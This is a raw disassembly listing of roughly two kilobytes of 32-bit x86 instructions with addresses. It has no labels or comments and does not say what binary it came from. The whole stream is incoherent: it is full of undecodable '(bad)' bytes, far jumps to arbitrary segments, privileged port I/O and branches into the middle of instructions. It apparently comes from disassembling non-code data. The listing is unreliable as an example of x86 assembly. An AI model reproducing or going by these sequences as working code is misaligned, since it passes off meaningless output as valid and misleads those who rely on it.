  410133:	sub    DWORD PTR [eax-0xcbc5c80],eax
  410139:	cmp    al,0xd0
  41013b:	scas   al,BYTE PTR es:[edi]
  41013c:	call   0xd0c2f863
  410141:	sbb    eax,0x6aa189e7
  410146:	mov    eax,ds:0xcfbf0b28
  41014b:	gs or  ah,ah
  41014e:	stos   BYTE PTR es:[edi],al
  41014f:	ds repz add al,0x9b
  410153:	(bad)  
  410154:	fisub  WORD PTR [ecx]
  410156:	pop    es
  410157:	inc    esi
  410158:	aaa    
  410159:	lock push esp
  41015b:	in     al,0xab
  41015d:	xchg   dh,dl
  41015f:	inc    esi
  410160:	out    0x64,al
  410162:	ins    BYTE PTR es:[edi],dx
  410163:	xor    eax,0xed8729a9
  410168:	imul   ecx,DWORD PTR [ebx+0xe],0xffffffde
  41016c:	jae    0x4101b6
  41016e:	cmc    
  41016f:	adc    eax,0x177cf1ff
  410174:	in     al,0x7a
  410176:	stos   BYTE PTR es:[edi],al
  410177:	cdq    
  410178:	or     DWORD PTR [edx],esi
  41017a:	lods   eax,DWORD PTR ds:[esi]
  41017b:	retf   
  41017c:	mov    dh,0x53
  41017e:	out    dx,al
  41017f:	fidiv  DWORD PTR [ebp+0x1ff13ef0]
  410185:	repz jg 0x4101b2
  410188:	mov    dh,0x10
  41018a:	(bad)  
  41018b:	lods   al,BYTE PTR ds:[esi]
  41018c:	mov    ss,ebp
  41018e:	mov    edi,0x7a0ebe7
  410193:	sahf   
  410194:	push   es
  410195:	icebp  
  410196:	(bad)  
  410197:	aam    0xed
  410199:	pop    ecx
  41019a:	dec    eax
  41019b:	sub    al,0xad
  41019d:	xchg   edi,eax
  41019e:	ss push 0x65992e03
  4101a4:	lock adc DWORD PTR [esi+0x69],ecx
  4101a8:	aad    0xf0
  4101aa:	inc    edx
  4101ab:	push   es
  4101ac:	(bad)
  4101af:	xchg   ebx,eax
  4101b0:	xchg   edi,eax
  4101b1:	inc    esi
  4101b2:	sbb    eax,0x2a
  4101b5:	retf   0x1d86
  4101b8:	xchg   ecx,eax
  4101b9:	jno    0x41019a
  4101bb:	scas   eax,DWORD PTR es:[edi]
  4101bc:	mov    bh,0xa9
  4101be:	daa    
  4101bf:	das    
  4101c0:	ins    DWORD PTR es:[edi],dx
  4101c1:	jle    0x410197
  4101c3:	pop    edi
  4101c4:	jmp    0x6cd6:0x8d524161
  4101cb:	stc    
  4101cc:	jg     0x410200
  4101ce:	xchg   DWORD PTR ds:0xf325a60e,ebx
  4101d4:	out    dx,al
  4101d5:	in     al,dx
  4101d6:	jo     0x4101b7
  4101d8:	sbb    DWORD PTR [ebp+0x93a004f],edx
  4101de:	inc    edi
  4101df:	scas   eax,DWORD PTR es:[edi]
  4101e0:	push   ebx
  4101e1:	sbb    BYTE PTR [edi+0x6f],cl
  4101e4:	or     BYTE PTR [edx+0x7537e538],al
  4101ea:	pop    ebx
  4101eb:	lock xchg ebx,eax
  4101ed:	mov    bl,0xf9
  4101ef:	pop    ss
  4101f0:	(bad)  
  4101f1:	pop    ss
  4101f2:	sub    DWORD PTR [eax],0xf9fca8e7
  4101f8:	dec    ecx
  4101f9:	dec    edi
  4101fa:	xchg   bl,dl
  4101fc:	add    ecx,DWORD PTR [ebp-0x5f6c54ed]
  410202:	mov    ecx,0xcbb20b28
  410207:	ja     0x410213
  410209:	push   0xffffff93
  41020b:	int    0x15
  41020d:	inc    eax
  41020e:	pop    ecx
  41020f:	inc    BYTE PTR [edi+0x5ff8ebc1]
  410215:	lock lods al,BYTE PTR ds:[esi]
  410217:	test   al,al
  410219:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41021a:	cmp    ecx,ebp
  41021c:	sub    BYTE PTR [edx],bh
  41021e:	aas    
  41021f:	cmp    eax,0xcd86c9f1
  410224:	fimul  WORD PTR [ebp+0x4725d197]
  41022a:	dec    edx
  41022b:	adc    eax,0x870af093
  410230:	mov    ch,0x7d
  410232:	mov    bl,0x57
  410234:	or     edx,esp
  410236:	pop    ecx
  410237:	sti    
  410238:	fiadd  WORD PTR [ecx-0x1b373f73]
  41023e:	or     eax,0x69d2b913
  410243:	sub    DWORD PTR [ecx-0x59],ecx
  410246:	fcom   DWORD PTR [esi+0x8]
  410249:	add    dh,BYTE PTR [ebx+edi*2-0x6b9220c7]
  410250:	daa    
  410251:	int3   
  410252:	jbe    0x41028b
  410254:	and    DWORD PTR [eax+0x21],esi
  410257:	or     BYTE PTR [ebp+0x50],dh
  41025a:	imul   eax,DWORD PTR ds:0x73e00957,0xfffffff4
  410261:	sub    al,BYTE PTR [ecx+0x3f1fda9]
  410267:	in     al,dx
  410268:	dec    eax
  410269:	icebp  
  41026a:	xchg   esi,eax
  41026b:	xor    DWORD PTR [esi+0x4246de3a],0xaf509053
  410275:	mov    ds:0x1ecf0986,eax
  41027a:	or     BYTE PTR [esi],ch
  41027c:	icebp  
  41027d:	popa   
  41027e:	mov    ch,0x29
  410280:	shl    ecx,cl
  410282:	sbb    eax,0x1c33783e
  410287:	mov    eax,ds:0x73878911
  41028c:	xchg   ebp,eax
  41028d:	(bad)  
  41028e:	xlat   BYTE PTR ds:[ebx]
  41028f:	fmul   st(1),st
  410291:	add    DWORD PTR ds:0xe79cd628,eax
  410297:	(bad)
  41029c:	ins    BYTE PTR es:[edi],dx
  41029d:	xor    ebx,DWORD PTR [edx+0x2eae9b27]
  4102a3:	test   al,0xcd
  4102a5:	inc    edx
  4102a7:	mov    ebx,0x8bda8c03
  4102ac:	mov    esi,0xf46af12f
  4102b1:	adc    DWORD PTR [eax],edx
  4102b3:	scas   al,BYTE PTR es:[edi]
  4102b4:	mov    eax,ds:0xc11e3619
  4102b9:	icebp  
  4102ba:	test   DWORD PTR ds:0xa6431bb4,0xc558410c
  4102c4:	out    0xf0,al
  4102c6:	push   ss
  4102c7:	mov    esp,0xd9dab739
  4102cc:	adc    al,BYTE PTR [edx+0xadffb1b]
  4102d2:	xchg   ch,al
  4102d4:	xchg   esi,eax
  4102d5:	jmp    0x9e360882
  4102da:	sub    al,0x28
  4102dc:	push   ebx
  4102dd:	cmp    cl,BYTE PTR [esi+ebx*4]
  4102e0:	or     dh,dl
  4102e2:	nop
  4102e3:	adc    eax,0x58c4a4e4
  4102e8:	scas   al,BYTE PTR es:[edi]
  4102e9:	or     BYTE PTR [eax+ecx*8+0x53],ah
  4102ed:	mov    eax,ds:0xfda22935
  4102f2:	inc    ebp
  4102f3:	mov    cl,0x8
  4102f5:	mov    WORD PTR [esi+esi*2-0x11],?
  4102f9:	retf   
  4102fa:	mov    dl,0x9d
  4102fc:	inc    ebp
  4102fd:	cli    
  4102fe:	push   edx
  4102ff:	fmul   DWORD PTR [ecx-0xa]
  410302:	aaa    
  410303:	pop    esp
  410304:	push   edx
  410305:	push   ebp
  410306:	or     eax,0x2cd20828
  41030b:	call   0x1481:0x74652888
  410312:	test   BYTE PTR [ecx+ecx*4+0x7dc91af1],dl
  410319:	popa   
  41031a:	push   edi
  41031b:	sbb    al,0xe6
  41031d:	(bad)  
  41031f:	and    ch,BYTE PTR [edi+ebp*4]
  410322:	xchg   BYTE PTR [ebx-0x44],bl
  410325:	clc    
  410326:	jg     0x4102eb
  410328:	push   ebp
  410329:	shl    DWORD PTR [ebp-0x6aed5c1f],0x78
  410330:	jecxz  0x4102ee
  410332:	jmp    0xf571:0xed566c2a
  410339:	in     al,0x91
  41033b:	xchg   ecx,eax
  41033c:	shl    BYTE PTR [edx],0x87
  41033f:	rcl    DWORD PTR [edi+ecx*1+0x32],0x44
  410344:	jmp    0x410337
  410346:	push   es
  410347:	aad    0xb2
  410349:	jns    0x41030f
  41034b:	mov    ds:0xf87a90e2,al
  410350:	or     esi,eax
  410352:	cmp    BYTE PTR [edi],0x27
  410355:	jno    0x41030c
  410357:	push   es
  410358:	dec    eax
  410359:	lock fs mov edx,edi
  41035d:	das    
  41035e:	popa   
  41035f:	in     al,0x7a
  410361:	mov    edx,0x20c8155b
  410366:	xchg   DWORD PTR [edi],esp
  410368:	daa    
  410369:	xchg   ebx,eax
  41036a:	sbb    dh,BYTE PTR [edi]
  41036c:	fwait
  41036d:	jae    0x4103a5
  41036f:	sub    ah,dh
  410371:	add    dl,0xca
  410374:	or     BYTE PTR [eax+edx*4-0x7172de87],al
  41037b:	inc    eax
  41037c:	in     eax,0xf0
  41037e:	mov    al,ds:0x37fa3f5
  410383:	(bad)  
  410384:	repz retf 0x2f39
  410388:	or     BYTE PTR [eax+0x76],cl
  41038b:	jecxz  0x410388
  41038d:	jge    0x41031e
  41038f:	nop
  410390:	and    cl,dh
  410392:	cs mov cl,0x1e
  410395:	mov    ds:0x1daf7d0d,al
  41039a:	pop    ebx
  41039b:	xchg   bl,dl
  41039d:	sub    BYTE PTR [edx-0x414fd489],bl
  4103a3:	test   al,0x7b
  4103a5:	in     eax,dx
  4103a6:	inc    esp
  4103a7:	in     eax,dx
  4103a8:	mov    eax,ds:0xa02d62a2
  4103ad:	or     al,BYTE PTR [edi+0x62]
  4103b0:	adc    ebx,esp
  4103b2:	add    al,0xf
  4103b4:	push   cs
  4103b5:	mov    edi,0xb2881e96
  4103ba:	mov    ch,0xda
  4103bc:	add    esi,eax
  4103be:	into   
  4103bf:	stos   DWORD PTR es:[edi],eax
  4103c0:	call   0xd971:0x74482bab
  4103c7:	push   cs
  4103c8:	xlat   BYTE PTR ds:[ebx]
  4103c9:	icebp  
  4103ca:	stc    
  4103cb:	inc    ecx
  4103cc:	mov    al,ds:0x7eb36bb8
  4103d1:	lock push cs
  4103d3:	outs   dx,DWORD PTR ds:[esi]
  4103d4:	cmp    BYTE PTR [eax],bl
  4103d6:	add    ebx,DWORD PTR ds:0xfc60d8c1
  4103dc:	mov    ebx,0x3e118791
  4103e1:	in     al,0xd1
  4103e3:	rcl    BYTE PTR [ebx+0x1e29dd35],1
  4103e9:	adc    BYTE PTR [ecx+0x25],bh
  4103ec:	or     BYTE PTR [esi-0x23],dh
  4103ef:	(bad)  
  4103f0:	fld    DWORD PTR [edi]
  4103f2:	pop    es
  4103f3:	push   DWORD PTR [edx-0x10]
  4103f6:	mov    al,ds:0xb4b972f7
  4103fb:	cmp    eax,0x902f7c46
  410400:	fimul  DWORD PTR [eax+0x52af9f86]
  410406:	lods   al,BYTE PTR ds:[esi]
  410407:	fwait
  410408:	cmc    
  410409:	push   0xffffffd5
  41040b:	sub    BYTE PTR [ebp-0x2],ch
  41040e:	daa    
  41040f:	xchg   edi,eax
  410410:	jl     0x410412
  410412:	sbb    BYTE PTR [esi+edi*1],dh
  410415:	popf   
  410416:	or     eax,0x6795ce28
  41041b:	mov    dl,0x43
  41041d:	ins    DWORD PTR es:[edi],dx
  41041e:	push   0xc56a9628
  410423:	je     0x41042d
  410425:	xor    BYTE PTR [eax-0x48],ah
  410428:	xor    DWORD PTR [ecx],ebp
  41042a:	imul   ebp,ecx,0xffffffb3
  41042d:	adc    BYTE PTR [edx+0x3f],0x8
  410431:	imul   ebp,esp,0x6f7d9a28
  410437:	jg     0x410444
  410439:	jbe    0x410477
  41043b:	leave  
  41043c:	mov    edi,0xc70f1dba
  410441:	std    
  410442:	cmp    edx,DWORD PTR [esi+0xf]
  410445:	lahf   
  410446:	jge    0x410471
  410448:	jp     0x4104a1
  41044a:	push   eax
  41044b:	(bad)  
  41044c:	or     al,0x66
  41044e:	in     eax,0x9a
  410450:	jg     0x41046d
  410452:	mov    BYTE PTR [edi],ch
  410454:	gs xor bh,dh
  410457:	out    dx,al
  410458:	pop    ebx
  410459:	lock fs mov cl,0xa6
  41045d:	push   0x2ec9163c
  410462:	in     eax,dx
  410463:	and    DWORD PTR [edi],esp
  410465:	(bad)  
  410466:	test   eax,0x861c36a5
  41046b:	out    0xac,eax
  41046d:	adc    BYTE PTR [ebx-0x4d68b005],bl
  410473:	das    
  410474:	sub    dh,BYTE PTR [esi+0x6ad762da]
  41047a:	xlat   BYTE PTR ds:[ebx]
  41047b:	push   0xad86739b
  410480:	xchg   esi,eax
  410481:	mov    esp,0x8d5d4ebb
  410486:	or     eax,0x8724f350
  41048b:	cmp    BYTE PTR [edx],dh
  41048d:	loope  0x4104c8
  41048f:	xchg   edx,eax
  410490:	inc    ebx
  410491:	repz xchg ecx,esp
  410494:	arpl   WORD PTR ds:[bx+si+0x3193],bp
  41049a:	pop    edi
  41049b:	sub    esi,edi
  41049d:	lods   eax,DWORD PTR ds:[esi]
  41049e:	cmp    ch,bh
  4104a0:	xor    BYTE PTR [ecx+edi*2-0x68],ah
  4104a4:	jno    0x4104a5
  4104a6:	cli    
  4104a7:	sub    eax,0x858e80cc
  4104ac:	jcxz   0x410435
  4104af:	xchg   ebx,eax
  4104b0:	mov    edx,ecx
  4104b2:	xor    ebx,DWORD PTR [edi-0x64]
  4104b5:	setp   bh
  4104b8:	pop    ecx
  4104b9:	adc    al,0xc6
  4104bb:	test   edi,esi
  4104bd:	retf   
  4104be:	into   
  4104bf:	sub    al,0x1f
  4104c1:	ret    0x595e
  4104c4:	xor    cl,dh
  4104c6:	fsubr  QWORD PTR [ebx]
  4104c8:	int3   
  4104c9:	scas   eax,DWORD PTR es:[edi]
  4104ca:	cmc    
  4104cb:	call   0xb190:0x56813f2
  4104d2:	xchg   bl,dh
  4104d4:	mov    al,ds:0x5c9eda69
  4104d9:	inc    DWORD PTR [edx]
  4104db:	fisub  WORD PTR [ebx+0x17]
  4104de:	or     DWORD PTR [ecx+0x69d8c38f],ebp
  4104e4:	push   cs
  4104e5:	(bad)  
  4104e7:	ins    BYTE PTR es:[edi],dx
  4104e8:	pminsw mm6,QWORD PTR [edi]
  4104eb:	out    dx,eax
  4104ec:	lds    esp,FWORD PTR [edx+ecx*8-0x5c480638]
  4104f3:	sub    cl,ah
  4104f5:	dec    edx
  4104f6:	jp     0x410498
  4104f8:	or     BYTE PTR [eax],bh
  4104fa:	add    eax,0xaf947d57
  4104ff:	in     al,0x98
  410501:	into   
  410502:	call   0xd08a:0x3ef2ba43
  410509:	test   al,0xc5
  41050b:	lds    dx,DWORD PTR [ecx-0x35bfb664]
  410512:	xchg   bl,cl
  410514:	lock xchg edi,eax
  410516:	rcr    DWORD PTR [esi-0x57],cl
  410519:	lock cli 
  41051b:	in     al,0xe3
  41051d:	sub    ch,BYTE PTR [ebx]
  41051f:	sbb    ecx,DWORD PTR [ebx+0x55]
  410522:	mov    esp,0x85fe8bec
  410527:	sbb    eax,0x4a4c161b
  41052c:	jmp    0xfc49:0x21c86ef0
  410533:	and    cl,0xd2
  410536:	pop    esi
  410537:	int    0xaf
  410539:	add    DWORD PTR [edi-0x4e9e76df],eax
  41053f:	popf   
  410540:	aas    
  410541:	and    bl,BYTE PTR [edi]
  410543:	sub    DWORD PTR [ebx+0x8c8fc6d],ebp
  410549:	push   0xffffff92
  41054b:	sub    DWORD PTR [esi+0x74ae7313],0x8
  410552:	mov    esp,0xd4c88769
  410557:	loope  0x410583
  410559:	jno    0x4105c6
  41055b:	push   edx
  41055c:	enter  0xb88,0x63
  410560:	or     BYTE PTR [eax],al
  410562:	nop
  410563:	mov    BYTE PTR [ecx-0x5f9b2bfb],ah
  410569:	in     al,dx
  41056a:	xor    bl,0x4e
  41056d:	js     0x410572
  41056f:	ficomp DWORD PTR [esi+edx*4+0x60e22307]
  410576:	mov    cl,0x9c
  410578:	pop    es
  410579:	add    eax,0x94671b86
  41057e:	pop    ebp
  41057f:	jae    0x4105a4
  410581:	retf   
  410582:	sub    BYTE PTR [ecx],0x88
  410585:	out    0x2c,al
  410587:	or     BYTE PTR es:[esi],ah
  41058a:	mov    dh,0x49
  41058c:	jmp    0x2fcb1d4a
  410591:	repz mov ch,BYTE PTR [edx+0x63ec35b9]
  410598:	ds js  0x41055c
  41059b:	stos   DWORD PTR es:[edi],eax
  41059c:	jl     0x41053e
  41059e:	cmp    DWORD PTR [eax],edx
  4105a0:	imul   esi,DWORD PTR [ebx+0x28b729a9],0xffffffde
  4105a7:	in     eax,dx
  4105a8:	push   ebp
  4105a9:	repnz push ebx
  4105ab:	sub    BYTE PTR [ebx+0x1a9dc4ff],dh
  4105b1:	pop    esp
  4105b2:	aas    
  4105b3:	cmp    BYTE PTR [ecx-0x10],bh
  4105b6:	cwde   
  4105b7:	jp     0x4105e2
  4105b9:	sub    BYTE PTR [ebp+0xe],cl
  4105bc:	inc    ebp
  4105bd:	repnz fsubr DWORD PTR [ecx]
  4105c0:	pop    ds
  4105c1:	test   DWORD PTR [edx-0x724a13c7],ecx
  4105c7:	cli    
  4105c8:	adc    al,BYTE PTR [esi-0x24b6bc77]
  4105ce:	(bad)  
  4105cf:	cli    
  4105d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4105d1:	adc    ah,BYTE PTR [edx]
  4105d3:	jg     0x410562
  4105d5:	div    DWORD PTR [edx-0x407c0bd7]
  4105db:	daa    
  4105dc:	or     esi,esp
  4105de:	xor    al,0x82
  4105e0:	inc    edi
  4105e1:	xor    al,0xd2
  4105e3:	jmp    0x2875:0x7aefe16
  4105ea:	or     BYTE PTR [edi-0x19],al
  4105ed:	leave  
  4105ee:	jp     0x4105f2
  4105f0:	imul   ecx,DWORD PTR [esi+0x73d6e03a],0x7fe50db8
  4105fa:	call   0xb9a9:0x4ff3e321
  410601:	mov    BYTE PTR [ebp+ebx*4-0x6322e4e],0x80
  410609:	lock push es
  41060b:	inc    esp
  41060c:	jo     0x4105bf
  41060e:	add    DWORD PTR [ebx+0x139c6f95],ecx
  410614:	cmp    DWORD PTR [ebx],ecx
  410616:	xchg   DWORD PTR [ebp-0xa],edi
  410619:	das    
  41061a:	sbb    eax,0xc2cdbfd7
  41061f:	sub    dh,BYTE PTR [esi]
  410621:	xor    eax,0x7863e855
  410626:	xchg   edi,eax
  410627:	push   0xffffffd5
  410629:	mov    cl,0x37
  41062b:	mov    eax,0x9d860530
  410630:	les    ebx,FWORD PTR [edx-0x9aa2e03]
  410636:	sahf   
  410637:	int    0x29
  410639:	aaa    
  41063a:	mov    al,ds:0x87310714
  41063f:	hlt    
  410640:	shl    BYTE PTR [esi+0x1],0x51
  410644:	jg     0x410602
  410646:	outs   dx,BYTE PTR ds:[esi]
  410647:	lahf   
  410648:	repnz scas al,BYTE PTR es:[edi]
  41064a:	and    BYTE PTR [ebx],ch
  41064c:	stc    
  41064d:	int3   
  41064e:	inc    eax
  41064f:	pushf  
  410650:	jmp    0x97ad:0xa1a86b8f
  410657:	cs pop es
  410659:	jb     0x410620
  41065b:	outs   dx,DWORD PTR ds:[esi]
  41065c:	pop    ds
  41065d:	sbb    dh,BYTE PTR [esi]
  41065f:	ret    0x3033
  410662:	xchg   DWORD PTR [ecx-0x4b],eax
  410665:	mov    BYTE PTR [eax],dl
  410667:	fisub  WORD PTR [ebp-0x640bf132]
  41066d:	icebp  
  41066e:	jnp    0x41067b
  410670:	in     eax,dx
  410671:	popa   
  410672:	jmp    0x8bc8:0x5f2c0993
  410679:	jns    0x4106f9
  41067b:	test   esi,edx
  41067d:	lock (bad) 
  41067f:	sbb    al,0xe3
  410681:	sub    ah,BYTE PTR [ebx+0x48ce5587]
  410687:	aam    0x9e
  410689:	lock cli 
  41068b:	aas    
  41068c:	mul    BYTE PTR [ebp-0xfebbef6]
  410692:	jl     0x410679
  410694:	popf   
  410695:	dec    edx
  410696:	ret    
  410697:	mov    cl,ch
  410699:	test   dh,dl
  41069b:	or     ch,dh
  41069d:	push   0xffffff87
  41069f:	cmc    
  4106a0:	cwde   
  4106a1:	not    BYTE PTR [ebp+edi*2-0x11]
  4106a5:	fwait
  4106a6:	or     edx,DWORD PTR [eax+0x40]
  4106a9:	sbb    DWORD PTR [esi-0x6eb960e6],eax
  4106af:	inc    ebp
  4106b0:	sbb    BYTE PTR ds:0x7e854d87,bh
  4106b6:	push   esi
  4106b7:	jmp    0x410696
  4106b9:	ret    
  4106ba:	lock pmulhw mm7,QWORD PTR [edx]
  4106be:	out    0x29,al
  4106c0:	adc    BYTE PTR [eax],al
  4106c2:	jb     0x410714
  4106c4:	jge    0x410732
  4106c6:	jo     0x410721
  4106c8:	mov    dh,al
  4106ca:	xor    al,0x55
  4106cc:	jmp    0x410735
  4106ce:	and    al,BYTE PTR [edi+edi*8-0x4181232c]
  4106d5:	lock shl cl,0xe
  4106d9:	add    ebx,edx
  4106db:	arpl   WORD PTR [esi],dx
  4106dd:	mov    ch,cl
  4106df:	dec    eax
  4106e0:	xchg   esi,eax
  4106e1:	mov    al,0x13
  4106e3:	xchg   esp,eax
  4106e4:	jb     0x41069e
  4106e6:	sahf   
  4106e7:	pop    ss
  4106e8:	jae    0x4106a5
  4106ea:	lds    ebp,FWORD PTR [ecx]
  4106ec:	dec    eax
  4106ed:	and    eax,0x20de8437
  4106f2:	fucomp st(2)
  4106f4:	shr    DWORD PTR [edi],1
  4106f6:	pop    esi
  4106f7:	sub    BYTE PTR [eax+edx*1-0xe402e24],dl
  4106fe:	scas   eax,DWORD PTR es:[edi]
  4106ff:	sub    DWORD PTR [edx+0x838f441],ecx
  410705:	fcmove st,st(2)
  410707:	getsec 
  410709:	je     0x4106a5
  41070b:	(bad)  [edi]
  41070d:	(bad)  
  41070e:	in     al,0x52
  410710:	hlt    
  410711:	or     ebp,ebp
  410713:	cmc    
  410714:	js     0x410782
  410716:	mov    esi,0x3cda08c8
  41071b:	mov    DWORD PTR [ecx+0x49],edi
  41071e:	push   edi
  41071f:	ja     0x410742
  410721:	retf   
  410722:	cmp    BYTE PTR [edi+ecx*8],cl
  410725:	jecxz  0x410724
  410727:	cld    
  410728:	mul    DWORD PTR [edx-0x27]
  41072b:	fs leave 
  41072d:	jns    0x410713
  41072f:	adc    eax,0xb1882128
  410734:	sub    DWORD PTR [esp+ecx*1-0x150f7b02],ebp
  41073b:	xchg   ebx,ebx
  41073d:	arpl   WORD PTR ss:[ebp-0x95a0886],di
  410744:	sub    dl,BYTE PTR [edx]
  410746:	cwde   
  410747:	pop    edi
  410748:	jl     0x410785
  41074a:	lahf   
  41074b:	sub    BYTE PTR [ebp+0x559bcf00],bh
  410751:	dec    eax
  410752:	push   es
  410753:	sub    BYTE PTR [ebx-0x82bf13a],bh
  410759:	add    DWORD PTR [esi],ecx
  41075b:	push   ebx
  41075c:	xor    al,0xf6
  41075e:	adc    al,0x7
  410760:	clc    
  410761:	icebp  
  410762:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410763:	push   cs
  410764:	xor    BYTE PTR [edi],0x6d
  410767:	fist   WORD PTR [edx-0x4d73e804]
  41076d:	mov    bh,0x89
  41076f:	aaa    
  410770:	jmp    0x8243
  410775:	hlt    
  410776:	dec    esi
  410777:	rcl    DWORD PTR [eax],cl
  410779:	das    
  41077a:	daa    
  41077b:	stos   DWORD PTR es:[edi],eax
  41077c:	mov    bh,0x15
  41077e:	in     eax,0x7c
  410780:	xor    DWORD PTR [esi-0x2f76ed74],ebp
  410786:	cmp    al,0x9d
  410788:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410789:	into   
  41078a:	xlat   BYTE PTR ds:[ebx]
  41078b:	sahf   
  41078c:	dec    ebx
  41078d:	outs   dx,BYTE PTR ds:[esi]
  41078e:	cmp    DWORD PTR [edi],edi
  410790:	not    esp
  410792:	jle    0x4107be
  410794:	jp     0x4107c2
  410796:	pop    ecx
  410797:	push   esp
  410798:	push   ecx
  410799:	add    al,0x90
  41079b:	mov    bl,0x1e
  41079d:	in     eax,0xf7
  41079f:	sub    DWORD PTR [edx+0x5bdf18f6],ebp
  4107a5:	push   ecx
  4107a6:	rol    dl,cl
  4107a8:	push   0x17
  4107aa:	daa    
  4107ab:	mov    esi,0xc90e6dd1
  4107b0:	xor    eax,0x10eb8191
  4107b5:	mov    eax,ds:0x8ec5ecf1
  4107ba:	fadd   QWORD PTR [ebx]
  4107bc:	or     BYTE PTR [ecx+0x31816014],bh
  4107c2:	cdq    
  4107c3:	in     al,dx
  4107c4:	jo     0x410772
  4107c6:	dec    edi
  4107c7:	ret    
  4107c8:	imul   edx,DWORD PTR [ecx+0x2a929a2],0xe8c3406e
  4107d2:	and    BYTE PTR [ecx],ch
  4107d4:	test   al,0x77
  4107d6:	pusha  
  4107d7:	mov    dl,0x8
  4107d9:	into   
  4107da:	mov    eax,ds:0xdbbd2a
  4107df:	and    dl,ch
  4107e1:	icebp  
  4107e2:	mov    ah,BYTE PTR [edi-0x3c]
  4107e5:	xchg   edi,eax
  4107e6:	cdq    
  4107e7:	lock imul esp,esp,0x75
  4107eb:	or     ch,BYTE PTR es:[edx+0x23a1807f]
  4107f2:	(bad)  
  4107f4:	cli    
  4107f5:	or     DWORD PTR [edx+0x79],edx
  4107f8:	pushf  
  4107f9:	icebp  
  4107fa:	out    0x79,al
  4107fc:	imul   edi,DWORD PTR [esi-0x7b706f],0xffffff92
  410803:	mov    WORD PTR [eax-0x61e878c4],cs
  410809:	(bad)  
  41080a:	push   cs
  41080b:	mov    dl,0x99
  41080d:	clc    
  41080e:	call   0x4cd1163d
  410813:	std    
  410814:	pop    edi
  410815:	sbb    eax,0x42daf872
  41081a:	mov    DWORD PTR [ecx+0x48],edi
  41081d:	push   edi
  41081e:	mov    al,0x61
  410820:	add    DWORD PTR ss:[esi],esi
  410823:	test   al,0x20
  410825:	inc    esi
  410826:	adc    DWORD PTR [ecx-0x2a788572],0xffffffc7
  41082d:	je     0x41081a
  41082f:	dec    esp
  410830:	(bad)  
  410831:	repnz into 
  410833:	sbb    ecx,DWORD PTR [eax+0x72378729]
  410839:	out    dx,eax
  41083a:	aam    0xc
  41083c:	fwait
  41083d:	xor    ebx,DWORD PTR ds:0x7cf56d4b
  410843:	sub    BYTE PTR [edi+0x1d99350a],dh
  410849:	ret    
  41084a:	xchg   ebp,ebx
  41084c:	jle    0x4107ed
  41084e:	mov    es,WORD PTR [edx+0x2936dba1]
  410854:	push   ss
  410855:	into   
  410856:	xor    ebx,edi
  410858:	push   es
  410859:	adc    cl,dl
  41085b:	jbe    0x410806
  41085d:	jge    0x410873
  41085f:	pop    edx
  410860:	mov    al,0x93
  410862:	daa    
  410863:	outs   dx,DWORD PTR ds:[esi]
  410864:	mov    bh,0x4b
  410866:	pusha  
  410867:	sub    DWORD PTR [ecx+0x1d2d9f1f],esi
  41086d:	nop
  41086e:	fisttp QWORD PTR [ebx+0x61]
  410871:	lock mov al,BYTE PTR [ecx-0x33]
  410875:	mov    edi,DWORD PTR [ecx+0x61f8cbdc]
  41087b:	sub    DWORD PTR [ecx+0x31ee5c4c],ebx
  410881:	mov    al,ds:0x639da79e
  410886:	jns    0x4108d8
  410888:	fcmove st,st(6)
  41088a:	call   0x97319ab7
  41088f:	cld    
  410890:	fidiv  DWORD PTR [ecx-0x7b]
  410893:	push   0xda238520
  410898:	mov    WORD PTR [esi+eax*4-0x124b7a3d],?
  41089f:	add    esi,DWORD PTR [edi+0x732f73a7]
  4108a5:	cmc    
  4108a6:	jl     0x410871
  4108a8:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  4108aa:	mov    dh,0x7c
  4108ac:	call   0x2c49:0x7f13870f
  4108b3:	loopne 0x41084c
  4108b5:	mov    ebx,0xc4fa2928
  4108ba:	std    
  4108bb:	cmp    eax,0x61c48600
  4108c0:	adc    ch,BYTE PTR [ebx+0x11]
  4108c3:	push   eax
  4108c4:	inc    edi
  4108c5:	clc    
  4108c6:	mov    DWORD PTR [esp+ebx*2-0x3c515bfc],edx
  4108cd:	lock push cs
  4108cf:	dec    esp
  4108d0:	js     0x41088e
  4108d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4108d3:	pop    ebx
  4108d4:	xlat   BYTE PTR ds:[ebx]
  4108d5:	sub    al,0xf5
  4108d7:	mov    ebx,0x8b8675a5
  4108dc:	icebp  
  4108dd:	je     0x4108e0
  4108df:	call   0xc26e:0x2b2b0c9f
  4108e6:	shl    BYTE PTR [ebx-0xed88121],1
  4108ec:	xlat   BYTE PTR ds:[ebx]
  4108ed:	(bad)  
  4108ee:	xchg   BYTE PTR [ecx-0x1a3eccdf],cl
  4108f4:	jmp    0xc1528037
  4108f9:	jo     0x41095b
  4108fb:	test   al,0x7b
  4108fd:	imul   ebx,ecx,0x88c7f247
  410903:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410904:	xchg   esp,ecx
  410906:	mov    ds:0x86b035c1,eax
  41090b:	rol    DWORD PTR [ebp-0x6ad7e970],1
  410911:	outs   dx,DWORD PTR ds:[esi]
  410912:	sahf   
  410913:	mov    al,ds:0xd71b5602
  410918:	xor    eax,0xbfaedd0f
  41091d:	inc    ebx
  41091e:	test   DWORD PTR [edi+0x215d8c37],ecx
  410924:	adc    esp,DWORD PTR [esi+edi*2-0x155c65d7]
  41092b:	int    0x8
  41092d:	into   
  41092e:	popf   
  41092f:	popa   
  410930:	iret   
  410931:	sti    
  410932:	xor    ebp,ebx
  410934:	jmp    0x410925
  410936:	xchg   edx,eax
  410937:	add    BYTE PTR [edx+0x3cf315bc],dh
  41093d:	adc    eax,DWORD PTR [edi+0x7c]
  410940:	push   cs
  410941:	shl    BYTE PTR [edi-0x62],cl
  410944:	jg     0x4108fb
  410946:	shr    BYTE PTR [ebx],1
  410948:	and    BYTE PTR [eax],ah
  41094a:	pop    ss
  41094b:	jnp    0x410935
  41094d:	retf   0x9a5d
  410950:	add    eax,0x58281fe9
  410955:	and    al,0x5c
  410957:	jmp    0x8a360564
  41095c:	arpl   WORD PTR [edx+eax*8],cx
  41095f:	mov    bl,0x11
  410961:	int3   
  410962:	jmp    0x553c:0x4ef10983
  410969:	lods   al,BYTE PTR ds:[esi]
  41096a:	imul   BYTE PTR [esi+0x27]
  41096d:	outs   dx,BYTE PTR ds:[esi]
